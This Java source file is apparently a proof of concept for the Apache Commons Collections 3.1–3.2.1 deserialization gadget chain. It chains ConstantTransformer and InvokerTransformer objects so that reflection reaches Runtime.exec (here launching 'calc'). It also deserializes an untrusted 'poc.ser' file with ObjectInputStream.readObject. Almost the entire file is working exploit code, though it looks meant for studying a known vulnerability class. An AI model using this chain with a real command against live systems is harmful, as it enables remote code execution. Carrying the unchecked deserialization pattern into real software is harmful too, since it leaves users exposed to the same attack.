package com.trganda;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * Effect Version: commons-collections 3.1 - 3.2.1
 * Jdk Request: Jdk < 1.7.1
 */

public class App {

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException,
            IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                    new Class[]{String.class}, new Object[]{"calc"})
        });
        chainedTransformer.transform(null);



        try {
            FileInputStream ifs = new FileInputStream(new File("poc.ser"));
            ObjectInputStream ois = new ObjectInputStream(ifs);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}